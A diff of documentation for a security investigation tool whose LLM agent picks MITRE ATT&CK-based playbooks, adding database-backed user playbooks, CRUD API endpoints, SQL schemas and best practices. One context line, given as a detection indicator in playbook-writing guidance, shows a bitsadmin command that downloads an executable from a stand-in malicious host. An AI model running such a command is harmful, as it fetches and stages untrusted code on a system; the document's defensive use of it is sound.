@@ -1,27 +1,63 @@
 # Investigation Playbooks
 
-Investigation playbooks provide strategic guidance for analyzing specific attack scenarios. The system uses LLM-based selection to automatically choose the most relevant playbook based on the user's investigation question.
+Investigation playbooks provide strategic guidance for analyzing specific attack scenarios. The system includes 20 built-in playbooks and supports custom user-created playbooks with full CRUD operations.
+
+## Two Types of Playbooks
+
+### 1. Base Playbooks (Immutable)
+
+- **Source**: YAML files in `api/worker/agents/playbooks/`
+- **Count**: 20 built-in playbooks
+- **Availability**: Always enabled for all investigations
+- **Modification**: Cannot be edited or deleted
+- **Cloning**: Can be cloned to create custom versions
+- **Selection**: LLM automatically selects most relevant playbook
+
+### 2. User Playbooks (Mutable)
+
+- **Source**: Database (`playbooks` table)
+- **Management**: Full CRUD via UI and API
+- **Availability**: Must be explicitly enabled per investigation
+- **Modification**: Can be edited, disabled, or deleted
+- **Creation**: Create from scratch or clone from base playbooks
+- **Persistence**: Stored in database, survives restarts
 
 ## Architecture
 
-### Dynamic Loading
+### Playbook Loading
 
-Playbooks are loaded dynamically from `api/worker/agents/playbooks/` directory:
+**Base Playbooks**:
+- Loaded from `api/worker/agents/playbooks/` directory on worker startup
+- All `.yaml` files auto-discovered
+- Hot-reload: `get_playbook_registry(reload=True)`
 
-- **Auto-discovery**: All `.yaml` files are loaded on worker startup
-- **Hot-reload support**: Call `get_playbook_registry(reload=True)` to reload from disk
-- **No hardcoding**: Add/modify/delete playbooks by editing YAML files
-- **UI integration ready**: Designed for future UI-based playbook management
+**User Playbooks**:
+- Loaded from `playbooks` database table
+- Filtered by `user_id` and `is_enabled=true`
+- Per-investigation filtering via `investigation_playbooks` table
 
 ### Selection Process
 
 1. User asks investigation question
-2. System presents all playbook descriptions to LLM
-3. LLM selects most relevant playbook (or "none")
-4. Selected playbook content injected into agent's investigation strategy
-5. Agent follows playbook guidance during investigation
+2. System loads available playbooks:
+   - All base playbooks (always available)
+   - User's enabled playbooks
+   - Investigation-specific enabled playbooks
+3. LLM receives all playbook descriptions
+4. LLM selects most relevant playbook (or "none")
+5. Selected playbook content injected into agent's system prompt
+6. Agent follows playbook guidance during investigation
 
-## Playbook Categories
+### Per-Investigation Enablement
+
+Playbooks can be enabled/disabled for specific investigations:
+
+- **Base playbooks**: Always enabled (no database record needed)
+- **User playbooks**: Opt-in per investigation via `investigation_playbooks` table
+- **Persistence**: Settings persist across sessions and users
+- **Flexibility**: Different playbooks for different investigation types
+
+## Base Playbook Categories
 
 ### MITRE ATT&CK Tactics (14 playbooks)
 
@@ -213,60 +249,136 @@ Make playbooks:
 - `bitsadmin.exe /transfer job http://malicious.com/file.exe`
 ```
 
-## Future: UI-Based Playbook Management
+## UI-Based Playbook Management
 
-The architecture supports future UI features:
+The system includes a full-featured playbook editor accessible at `/playbooks`.
 
-### Planned Features
+### Features
 
-- **View Playbooks**: Browse all available playbooks in UI
-- **Edit Playbooks**: Modify playbook content via web interface
-- **Create Playbooks**: Add new playbooks without touching files
-- **Delete Playbooks**: Remove playbooks from UI
-- **Import/Export**: Share playbooks between systems
-- **Version Control**: Track playbook changes over time
+**Viewing**:
+- Browse all playbooks (base + custom)
+- Search by name or description
+- View playbook content with syntax highlighting
+- Markdown rendering with code block support
 
-### Implementation Notes
+**Creating**:
+- Create custom playbooks from scratch
+- Clone base playbooks to create editable copies
+- Markdown editor with validation
+- Auto-generated unique names for clones
 
-When implementing UI management:
+**Editing**:
+- Modify name, description, and content
+- Real-time validation
+- Prevent duplicate names
+- Update timestamp tracking
 
-1. **Storage**: Keep YAML files as source of truth
-2. **Validation**: Validate YAML structure before saving
-3. **Reload**: Call `get_playbook_registry(reload=True)` after changes
-4. **Permissions**: Restrict playbook editing to admin users
-5. **Backup**: Keep backups of modified playbooks
-6. **Audit**: Log who modified which playbooks
+**Managing**:
+- Enable/disable playbooks globally
+- Delete custom playbooks
+- Per-investigation enablement (via API)
+- Persistent settings across sessions
 
-### API Endpoints (Future)
+### API Endpoints
 
-```python
-# List all playbooks
-GET /api/v1/playbooks
+**Playbook CRUD**:
+```bash
+# List all playbooks (base + user)
+GET /api/v1/playbooks/list
 
-# Get specific playbook
-GET /api/v1/playbooks/{name}
+# Get user playbooks only
+GET /api/v1/playbooks/user
+
+# Get base playbooks only
+GET /api/v1/playbooks/base
 
 # Create playbook
-POST /api/v1/playbooks
+POST /api/v1/playbooks/create
 {
   "name": "my_playbook",
   "description": "...",
-  "playbook": "..."
+  "playbook": "...",
+  "is_enabled": true
 }
 
 # Update playbook
-PUT /api/v1/playbooks/{name}
+PUT /api/v1/playbooks/{id}
 {
+  "name": "...",
   "description": "...",
-  "playbook": "..."
+  "playbook": "...",
+  "is_enabled": true
 }
 
 # Delete playbook
-DELETE /api/v1/playbooks/{name}
+DELETE /api/v1/playbooks/{id}
 
-# Reload playbooks from disk
-POST /api/v1/playbooks/reload
+# Clone base playbook
+POST /api/v1/playbooks/clone/{name}
 ```
+
+**Investigation Control**:
+```bash
+# Get enabled playbooks for investigation
+GET /api/v1/playbooks/investigation/{investigation_id}
+
+# Enable playbook for investigation
+POST /api/v1/playbooks/investigation/{investigation_id}/enable
+{
+  "playbook_id": 1,
+  "is_enabled": true
+}
+
+# Disable playbook for investigation
+DELETE /api/v1/playbooks/investigation/{investigation_id}/disable/{playbook_id}
+```
+
+### Database Schema
+
+**playbooks table**:
+```sql
+CREATE TABLE playbooks (
+    playbook_id BIGSERIAL PRIMARY KEY,
+    user_id BIGINT NOT NULL REFERENCES users(user_id) ON DELETE CASCADE,
+    name TEXT NOT NULL CHECK (length(name) > 0),
+    description TEXT NOT NULL CHECK (length(description) > 0),
+    playbook TEXT NOT NULL CHECK (length(playbook) > 0),
+    is_enabled BOOLEAN NOT NULL DEFAULT true,
+    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
+    updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
+);
+```
+
+**investigation_playbooks table**:
+```sql
+CREATE TABLE investigation_playbooks (
+    id BIGSERIAL PRIMARY KEY,
+    investigation_id UUID NOT NULL REFERENCES investigations(investigation_id) ON DELETE CASCADE,
+    playbook_id BIGINT NOT NULL REFERENCES playbooks(playbook_id) ON DELETE CASCADE,
+    is_enabled BOOLEAN NOT NULL DEFAULT true,
+    enabled_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
+    CONSTRAINT uq_investigation_playbook UNIQUE (investigation_id, playbook_id)
+);
+```
+
+### Usage Workflow
+
+**Scenario**: Create custom playbook for your environment
+
+1. **Navigate to Playbooks**: Click user menu → Playbooks
+2. **Find base playbook**: Search for "lateral movement"
+3. **Clone playbook**: Click "Clone" button → Creates "lateral_movement_copy"
+4. **Edit clone**: Click "Edit" → Modify for your network
+5. **Save**: Playbook now available for all investigations
+6. **(Optional) Per-investigation control**: Use API to enable for specific investigations
+
+**Scenario**: Disable playbook temporarily
+
+1. Navigate to Playbooks
+2. Find custom playbook
+3. Click eye icon to disable
+4. Playbook hidden from agent selection
+5. Click eye icon again to re-enable
 
 ## Debugging
 
@@ -347,13 +459,53 @@ If two playbooks cover similar ground:
 
 ## Current Playbook Inventory
 
-**Total**: 21 playbooks (14 tactics + 7 techniques)
+**Base Playbooks**: 20 built-in (14 tactics + 6 techniques)
 
 **MITRE ATT&CK Coverage**: Complete (all 14 tactics)
 
-**Attack Techniques**: 7 focused playbooks for common attack methods
+**Attack Techniques**: 6 focused playbooks for common attack methods
 
-**Next Steps**: Add more technique-specific playbooks as needed based on investigation patterns
+**User Playbooks**: Unlimited (database-backed, per-user)
+
+**Next Steps**: 
+- Create custom playbooks for your environment
+- Clone and modify base playbooks
+- Share playbook best practices with community
+
+## Playbook Management Best Practices
+
+### Organizing Custom Playbooks
+
+**Naming Convention**:
+- Use descriptive names: `lateral_movement_finance_dept`
+- Include environment: `credential_access_windows_servers`
+- Version if needed: `ransomware_detection_v2`
+
+**When to Create Custom Playbooks**:
+- Environment-specific indicators (custom applications, unique network topology)
+- Industry-specific attacks (financial, healthcare, retail)
+- Compliance requirements (PCI-DSS, HIPAA, SOC2)
+- Internal tool detection (custom LOLBins, approved software)
+
+**When to Clone Base Playbooks**:
+- Need similar structure but different indicators
+- Want to add environment-specific context
+- Testing modifications before creating from scratch
+
+### Playbook Lifecycle
+
+1. **Create**: Clone base or create from scratch
+2. **Test**: Use in investigation, verify effectiveness
+3. **Refine**: Update based on results
+4. **Share**: Export/document for team use
+5. **Maintain**: Update as threats evolve
+
+### Performance Considerations
+
+- **Playbook Size**: Keep under 5000 characters for optimal LLM performance
+- **Selection Speed**: More playbooks = slower LLM selection (20-30 is optimal)
+- **Disable Unused**: Disable playbooks not relevant to current investigations
+- **Database Impact**: Minimal - playbooks loaded once per agent job
 
 ---
 
